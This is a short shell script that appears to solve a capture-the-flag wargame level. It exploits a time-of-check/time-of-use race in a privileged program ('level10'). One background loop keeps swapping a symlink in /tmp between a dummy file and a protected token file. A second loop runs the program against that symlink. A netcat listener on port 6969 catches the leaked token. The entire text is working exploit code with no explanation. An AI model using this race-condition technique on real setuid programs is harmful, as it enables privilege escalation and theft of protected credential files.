echo '.*( )*.' > /tmp/swap

(while true
do
        ln -fs /tmp/swap /tmp/toto
        ln -fs ~/token /tmp/toto
done)&

(while true; do
        ~/level10 /tmp/toto 127.0.0.1 &> /dev/null
done)&


(while true
    do nc -l 6969
done)